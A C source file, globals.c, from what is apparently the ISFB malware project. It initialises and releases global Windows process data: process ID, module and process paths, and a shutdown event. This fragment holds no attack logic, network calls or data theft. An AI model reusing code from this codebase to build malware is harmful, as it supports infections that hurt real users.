//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: globals.c
// $Revision: 386 $
// $Date: 2014-10-24 19:23:18 +0400 (Пт, 24 окт 2014) $
// description:
//	 Global constants and variables

#include "main.h"
#include <shlobj.h>

#include "memalloc.h"
#include "globals.h"
#include "pssup.h"

DWORD		g_CurrentProcessId		=	0;
DWORD		g_SystemVersion			=	0;
DWORD		g_CurrentProcessFlags	=	0;
HMODULE		g_CurrentProcessModule	=	0;
HMODULE		g_CurrentModule			=	0;
LPTSTR		g_CurrentProcessPath	=	0;
LPTSTR		g_CurrentModulePath		=	0;
HANDLE		g_AppShutdownEvent		=	0;




VOID ReleaseGlobals(VOID)
{
	if (g_CurrentProcessPath)
		AppFree(g_CurrentProcessPath);

	if (g_CurrentModulePath)
		AppFree(g_CurrentModulePath);

	if (g_AppShutdownEvent)
		CloseHandle(g_AppShutdownEvent);
}



WINERROR InitGlobals(HMODULE CurrentModule, ULONG Flags)
{
	WINERROR Status = NO_ERROR;

	g_CurrentModule = CurrentModule;
	g_CurrentProcessModule = GetModuleHandle(NULL);

	if (Flags & G_SYSTEM_VERSION)
		g_SystemVersion		= GetVersion();

	if (Flags & G_CURRENT_PROCESS_ID)
		g_CurrentProcessId	= GetCurrentProcessId();

	do 
	{
		if (Flags & G_APP_SHUTDOWN_EVENT)
		{
			if (!(g_AppShutdownEvent = CreateEvent(NULL, TRUE, FALSE, 0)))
			{
				Status = GetLastError();
				DbgPrint("Globals: Initializing AppShutdownEvent failed with status %u.\n", Status);
				break;
			}
		}	// if (Flags & G_APP_SHUTDOWN_EVENT)

		if (Flags & G_CURRENT_MODULE_PATH)
		{
			LPWSTR	pPath;

			// Resolving current module path
			if ((Status = PsSupGetModulePathW(g_CurrentModule, &pPath)) != NO_ERROR)
			{
				DbgPrint("Globals: PsSupGetModulePath failed with status %u.\n", Status);
				break;
			}

#if _UNICODE
			g_CurrentModulePath = pPath;
#else
			// We have to use short path for non-unicode programs to fully support non-latin file names
			{
				ULONG Len;

				PathGetShortPath(pPath);
				Len = lstrlenW(pPath);

				if (g_CurrentModulePath = AppAlloc(Len + 1))
					wcstombs(g_CurrentModulePath, pPath, Len + 1);
				else
					Status = ERROR_NOT_ENOUGH_MEMORY;

				AppFree(pPath);

				if (Status != NO_ERROR)
					break;
			}
#endif
		}	// if (Flags & G_CURRENT_MODULE_PATH)

		if (Flags & G_CURRENT_PROCESS_PATH)
		{
			if ((Status = PsSupGetModulePath(NULL, &g_CurrentProcessPath) != NO_ERROR))
			{
				DbgPrint("Globals: PsSupGetModulePath failed with status %u.\n", Status);
				break;
			}
		}
	} while(FALSE);

	if (Status != NO_ERROR)
		ReleaseGlobals();

	return(Status);
}